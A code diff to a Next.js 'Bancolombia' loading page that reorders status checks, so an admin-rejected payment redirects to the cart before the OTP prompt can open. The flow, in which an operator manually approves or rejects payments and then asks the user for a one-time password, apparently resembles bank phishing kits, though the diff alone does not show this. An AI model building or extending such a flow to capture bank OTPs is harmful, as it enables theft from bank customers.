@@ -39,12 +39,17 @@ export default function BancolombiaCargandoPage() {
           
           setStatus(newStatus);
 
+          // Primero verificar si fue rechazado (prioridad máxima)
+          if (newStatus === 'admin_rejected') {
+            console.log('❌ Payment rejected, redirecting');
+            router.push('/carrito?error=pago_fallido');
+            return; // Salir inmediatamente sin hacer nada más
+          }
+          
+          // Solo mostrar modal si el estado es waiting_otp
           if (newStatus === 'waiting_otp') {
             console.log('🔔 Status is waiting_otp - Opening OTP modal');
             setShowOtpModal(true);
-          } else if (newStatus === 'admin_rejected') {
-            console.log('❌ Payment rejected, redirecting');
-            router.push('/carrito?error=pago_fallido');
           }
         }
       } catch (error) {
